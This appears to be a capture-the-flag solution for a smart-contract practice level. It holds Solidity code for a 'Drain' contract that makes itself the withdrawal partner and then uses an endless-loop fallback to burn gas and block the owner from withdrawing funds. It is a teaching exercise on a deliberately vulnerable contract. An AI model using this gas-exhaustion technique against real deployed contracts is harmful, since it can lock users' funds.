/*

This example again uses the trick of fallback function to get our hack done

In order to deny funds withdrawal to the owner, we need to halt the execution at some prior point so as to not allow the owner to succesfully withdraw funds

This can be done using the call statement (just prior to the owner transfer function), wherein we can call a fallback function which would ruin all the remaining gas and thus deny withdrawal

This also means that we need to deploy another contract so that we can make that contract the new partner, which in turn will allow us to call the fallback function

*/

// === Solidity Code
// Deployed and Tested using Remix
// Deploy the Drain contract

/*

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Drain {

  // addr obtained from console (contract.address)
  address a = addr;

  constructor() {
    // Constructor calls the setPartner method to set this contract account as the new partner for withdrawals
    (bool success, bytes memory data) = a.call(
      abi.encodeWithSignature("setWithdrawPartner(address)", address(this))
    );
  }

  // This fallback function will be called once the owner starts the withdrawal process, notice it has an endless running loop which will eat up all remaining gas
  fallback() external payable {
    // Some quirky ways to infinite looping
    for(uint i=1;i<10;i++) i--;
  }
  
}
